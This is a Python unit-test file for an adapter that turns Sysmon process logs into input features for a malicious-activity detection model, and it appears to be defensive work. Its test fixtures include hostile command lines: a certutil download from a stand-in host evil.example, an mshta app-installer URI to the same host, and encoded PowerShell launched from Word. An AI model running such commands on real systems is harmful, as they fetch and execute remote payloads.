"""Unit tests for the Sysmon -> model-input adapter (Haitham, VM workstream)."""

import math
import os
import sys
import unittest

import pandas as pd

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from src.vm_schema_adapter import (  # noqa: E402
    MODEL_INPUT_COLUMNS,
    NEVER_FEATURE_COLUMNS,
    compute_row_features,
    make_record_id,
    normalize_command_line,
)


def base_event(**overrides):
    row = {
        "UtcTime": "2026-11-02T10:00:00.000Z",
        "Computer": "WIN11-TEST",
        "ProcessId": "4321",
        "Image": r"C:\Windows\System32\cmd.exe",
        "ParentImage": r"C:\Windows\explorer.exe",
        "CommandLine": "cmd.exe /c whoami",
        "ParentCommandLine": "explorer.exe",
        "User": "WIN11-TEST\\testuser",
        "IntegrityLevel": "Medium",
        "scenario_id": "BEN-001",
    }
    row.update(overrides)
    return row


class TestNormalization(unittest.TestCase):
    def test_url_templated(self):
        out = normalize_command_line("certutil -urlcache -f https://evil.example/x.bin payload.b64")
        self.assertIn("<URL>", out)
        self.assertNotIn("evil.example", out)

    def test_named_uri_scheme_templated(self):
        out = normalize_command_line('mshta ms-appinstaller:?source=https://evil.example/p.appx')
        self.assertIn("<URL>", out)

    def test_guid_templated(self):
        out = normalize_command_line("msiexec /x {7940ACF8-60BA-4213-A7C3-F3B400EE266D} /qn")
        self.assertIn("{<GUID>}", out)

    def test_ip_four_octets(self):
        out = normalize_command_line("ping 192.0.2.10 > out.txt")
        self.assertIn("<IP>", out)
        self.assertNotIn("192.0.2.10", out)

    def test_case_preserved(self):
        out = normalize_command_line("PowerShell.EXE -NoProfile")
        self.assertIn("PowerShell.EXE", out)

    def test_empty_input(self):
        self.assertEqual(normalize_command_line(""), "")
        self.assertEqual(normalize_command_line(None), "")


class TestRowFeatures(unittest.TestCase):
    def test_schema_and_no_label_leakage(self):
        feats = compute_row_features(base_event(), None)
        missing = [c for c in MODEL_INPUT_COLUMNS if c not in feats]
        self.assertEqual(missing, [])
        for leaked in NEVER_FEATURE_COLUMNS - {"scenario_id", "record_id"}:
            self.assertNotIn(leaked, MODEL_INPUT_COLUMNS)

    def test_basename_lowercased(self):
        feats = compute_row_features(base_event(Image=r"C:\Windows\System32\CMD.EXE"), None)
        self.assertEqual(feats["process_name"], "cmd.exe")

    def test_empty_parent_image(self):
        feats = compute_row_features(base_event(ParentImage=""), None)
        self.assertEqual(feats["parent_process"], "")
        self.assertEqual(feats["parent_known"], 0)
        self.assertEqual(feats["parent_is_office"], 0)
        self.assertEqual(feats["parent_child_suspicious"], 0)

    def test_office_parent_and_lolbin_child(self):
        feats = compute_row_features(
            base_event(Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                       ParentImage=r"C:\Program Files\Microsoft Office\winword.exe",
                       CommandLine="powershell.exe -NoProfile -enc AAAA"), None)
        self.assertEqual(feats["parent_is_office"], 1)
        self.assertEqual(feats["parent_child_suspicious"], 1)
        self.assertEqual(feats["process_is_powershell"], 1)

    def test_powershell_encoded_flag(self):
        feats = compute_row_features(
            base_event(Image="powershell.exe",
                       CommandLine="powershell -NoP -enc JABQAFMAVgBlAHIA"), None)
        self.assertEqual(feats["flag_enc"], 1)
        self.assertEqual(feats["flag_nop"], 1)

    def test_cmd_counts(self):
        feats = compute_row_features(
            base_event(CommandLine='cmd.exe /c "a | b & c > d; e ` f \'g\'"'), None)
        self.assertEqual(feats["cmd_pipe_count"], 1)
        self.assertEqual(feats["cmd_amp_count"], 1)
        self.assertEqual(feats["cmd_redirect_count"], 1)
        self.assertEqual(feats["cmd_semicolon_count"], 1)
        self.assertEqual(feats["cmd_backtick_count"], 1)

    def test_entropy_of_constant_string_is_zero(self):
        feats = compute_row_features(base_event(CommandLine="aaaaaaaaaaaa"), None)
        self.assertEqual(feats["cmd_entropy"], 0.0)

    def test_unrecoverable_flag_is_nan(self):
        import math as m
        feats = compute_row_features(base_event(), None)
        self.assertTrue(m.isnan(feats["flag_msbuild"]))

    def test_network_join_present(self):
        net = pd.DataFrame([{
            "ProcessId": 4321, "scenario_id": "ATK-001",
            "UtcTime": "2026-11-02T10:00:01.000Z",
            "Image": r"C:\Windows\System32\cmd.exe",
            "DestinationIp": "198.51.100.10",
            "DestinationPort": "443",
            "Protocol": "tcp",
        }])
        net["ProcessId"] = pd.to_numeric(net["ProcessId"])
        feats = compute_row_features(base_event(scenario_id="ATK-001"), net)
        self.assertEqual(feats["network_connection_true"], 1)
        self.assertEqual(feats["has_destination"], 1)

    def test_network_join_absent(self):
        net = pd.DataFrame({"ProcessId": [999], "scenario_id": ["ATK-001"],
                            "DestinationIp": ["198.51.100.10"]})
        net["ProcessId"] = pd.to_numeric(net["ProcessId"])
        feats = compute_row_features(base_event(scenario_id="ATK-001"), net)
        self.assertEqual(feats["network_connection_true"], 0)
        self.assertEqual(feats["has_destination"], 0)

    def test_network_not_supplied_is_nan(self):
        import math as m
        feats = compute_row_features(base_event(), None)
        self.assertTrue(m.isnan(feats["network_connection_true"]))
        self.assertTrue(m.isnan(feats["has_destination"]))


class TestRecordId(unittest.TestCase):
    def test_deterministic_and_prefixed(self):
        row = pd.Series(base_event())
        a = make_record_id(row)
        b = make_record_id(row)
        self.assertEqual(a, b)
        self.assertTrue(a.startswith("vm_"))


if __name__ == "__main__":
    unittest.main()
